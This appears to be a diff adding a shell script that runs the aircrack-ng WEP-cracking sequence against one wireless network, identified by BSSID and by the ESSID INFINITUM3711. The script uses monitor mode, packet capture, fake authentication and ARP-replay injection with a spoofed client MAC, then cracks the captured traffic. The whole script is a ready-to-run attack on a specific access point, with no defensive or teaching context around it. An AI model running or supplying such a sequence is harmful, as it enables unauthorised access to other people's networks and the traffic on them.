@@ -1,0 +1,13 @@
+
+
+sudo /etc/rc.d/wicd stop
+sudo airmon-ng stop wlan0
+sudo airmon-ng start wlan0
+sudo airodump-ng mon0
+sudo airodump-ng -c 2 -w net3711 --bssid 00:23:51:5C:9D:E1 mon0
+
+sudo aireplay-ng -1 0 -a 00:23:51:5C:9D:E1 -h 00:22:FA:06:79:36 -e INFINITUM3711 mon0
+sudo aireplay-ng -3 -b 00:23:51:5C:9D:E1 -h 00:22:FA:06:79:36 mon0
+
+sudo aircrack-ng *.cap
+
